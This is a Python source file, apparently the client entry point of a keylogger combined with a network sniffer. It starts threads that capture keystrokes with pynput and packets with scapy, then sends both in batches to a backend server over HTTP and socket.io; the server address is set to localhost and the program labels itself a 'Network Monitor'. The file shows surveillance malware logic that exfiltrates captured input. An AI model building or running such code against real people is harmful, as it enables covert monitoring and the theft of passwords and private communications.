import atexit
import requests
import socketio
from threading import Thread

from pynput import keyboard
from scapy.sendrecv import sniff

from recorder import handle_key_press, handle_key_release, send_batched_keystrokes
from sniffer import handle_sniffed_packets, send_batched_packets

HOST_IP = "127.0.0.1"
HOST_PORT = "3000"

BACKEND_URL = f"http://{HOST_IP}:{HOST_PORT}/api"

packets_buffer = []


def packets_thread_callback():
    send_batched_packets(sio)


def keystrokes_thread_callback():
    send_batched_keystrokes(BACKEND_URL)


def on_exit():
    print("Disconnecting from server...")

    try:
        # TODO: try Disconnecting from network with data.
        sio.disconnect()
        print("Successfully Disconnected socket from server")
    except Exception as e:
        print(f"Failed Disconnecting socket from server {e}")


atexit.register(on_exit)

if __name__ == "__main__":
    print("Initializing Socket Server")
    _ = requests.get(f"{BACKEND_URL}/api/socket.io")

    print("Attempting Socket connection")
    sio = socketio.Client()
    sio.connect(BACKEND_URL, socketio_path="/api/socket.io")
    sio.emit("NetworkNodeConnection")

    print("Starting Network Monitor...")
    # Start various threads
    sniffingThread = Thread(target=packets_thread_callback, daemon=True)
    loggerThread = Thread(target=keystrokes_thread_callback, daemon=True)

    print("Starting Sniffer Thread")
    sniffingThread.start()
    print("Starting Key Logger Thread")
    loggerThread.start()
    sniff(prn=handle_sniffed_packets)

    with keyboard.Listener(
        on_press=handle_key_press, on_release=handle_key_release
    ) as key_recorder:
        print("Listening to keylogs...")
        key_recorder.join()
